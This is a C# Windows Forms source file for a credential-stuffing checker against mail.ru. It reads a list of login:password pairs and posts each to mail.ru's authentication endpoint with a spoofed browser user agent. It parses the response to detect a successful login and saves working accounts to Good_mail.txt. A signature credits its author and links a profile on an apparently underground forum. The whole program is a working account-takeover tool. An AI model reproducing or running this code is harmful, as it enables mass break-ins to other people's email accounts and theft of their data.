using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;
using Fizzler;
using Fizzler.Systems.HtmlAgilityPack;
using HtmlAgilityPack;

namespace BSOD
{
    public partial class Form1 : Form
    {
        string[] Accounts;
        Thread Potok;
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            label14.Text = "0";
            label12.Text = "0";
            Potok = new Thread(Proverka_Avtoreg);
            Potok.Start();

        } //press start

        private static string[] Razdelit(string Stroka_Text, char Razdelitel) //login and pass
        {
            Stroka_Text.Replace(";", ":").Replace("|", ":");
            string[] q = Stroka_Text.Split(Razdelitel);
            return q;
        }

        HttpRequest danni = new HttpRequest();

        private static string Avtoreg(string Login, string Pass, ref HttpRequest danni, string Domain)
        {
            danni.Cookies = new CookieDictionary();
            danni.KeepAlive = true;
            danni.UserAgent = Http.OperaUserAgent();
            danni.AddHeader("Referer", "https://my.mail.ru/");
            danni.AddHeader("Upgrade-Insecure-Reques", "1");
            danni.AddHeader("DNT", "1");

            RequestParams reqParams = new RequestParams();
            reqParams["Login"] = Login;
            reqParams["Password"] = Pass;
            reqParams["Domain"] = Domain;
            reqParams["FailPage"] = "https://my.mail.ru/cgi-bin/login?fail=1";
            reqParams["page"] = "https://my.mail.ru";

            string response = danni.Post("https://auth.mail.ru/cgi-bin/auth", reqParams, true).ToString();

            return response;
        }

        void Proverka_Avtoreg()
        {
            for (int i = 0; i < Accounts.Count(); i++)
            {                
                string Danni_Polzovatelya = Accounts[i].Replace(";", ":").Replace("|", ":");
                string[] Razdeliy_Danni = Razdelit(Danni_Polzovatelya, ':');
                string[] Domain = Razdelit(Razdeliy_Danni[0], '@');

                string response = Avtoreg(Razdeliy_Danni[0], Razdeliy_Danni[1], ref danni, Domain[1]);

                HtmlAgilityPack.HtmlDocument Hap = new HtmlAgilityPack.HtmlDocument();
                Hap.LoadHtml(response);


                try { response = danni.Get(Hap.DocumentNode.QuerySelector("a.b-welcome-game__content__more").GetAttributeValue("href", null)).ToString(); } catch { }
                Hap.LoadHtml(response);


                string Proverka_Ok = "";

                try
                {
                    Good_akk(Proverka_Ok, Hap, Danni_Polzovatelya);
                }
                catch
                {
                    this.Invoke((MethodInvoker)delegate () { label12.Text = Convert.ToInt32(Convert.ToInt32(label12.Text) + 1).ToString(); });                       
                    System.IO.File.AppendAllText("Bad_mail.txt", Danni_Polzovatelya + "\n");
                }

                this.Invoke((MethodInvoker)delegate () { label5.Text = i.ToString(); });
                this.Invoke((MethodInvoker)delegate () { label6.Text = Convert.ToInt32(Accounts.Count() - i).ToString(); });
                
                Thread.Sleep(900);
            }
            this.Invoke((MethodInvoker)delegate () { label6.Text = Convert.ToInt32(Convert.ToInt32(label6.Text) - 1).ToString(); });            
            richTextBox1.Text = "Check off\nRestart the software\nSoft by HiSkiN's\nProfile - https://lolz.guru/oooooooooooooooo/";
        }

        void Good_akk(string Proverka_Ok, HtmlAgilityPack.HtmlDocument Hap, string Danni_Polzovatelya)
        {
            Proverka_Ok = Hap.DocumentNode.QuerySelector("div.b-left-menu-wrapper").InnerHtml;

            if (Proverka_Ok.Contains("b-left-menu__item b-left-menu__item_selected"))
            {
                this.Invoke((MethodInvoker)delegate () { label14.Text = Convert.ToInt32(Convert.ToInt32(label14.Text) + 1).ToString(); });               
                System.IO.File.AppendAllText("Good_mail.txt", Danni_Polzovatelya + "\n");
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel5_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click_1(object sender, EventArgs e)
        {

        }

        private void label10_Click_1(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {
          
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            OpenFileDialog opFile = new OpenFileDialog();

            if (opFile.ShowDialog() == DialogResult.OK)
            {
                Accounts = System.IO.File.ReadAllLines(opFile.FileName);
                button2.Enabled = true;
            }
            label4.Text = Accounts.Count().ToString(); //кол-во строк
            
        } //открыть список
    }
}
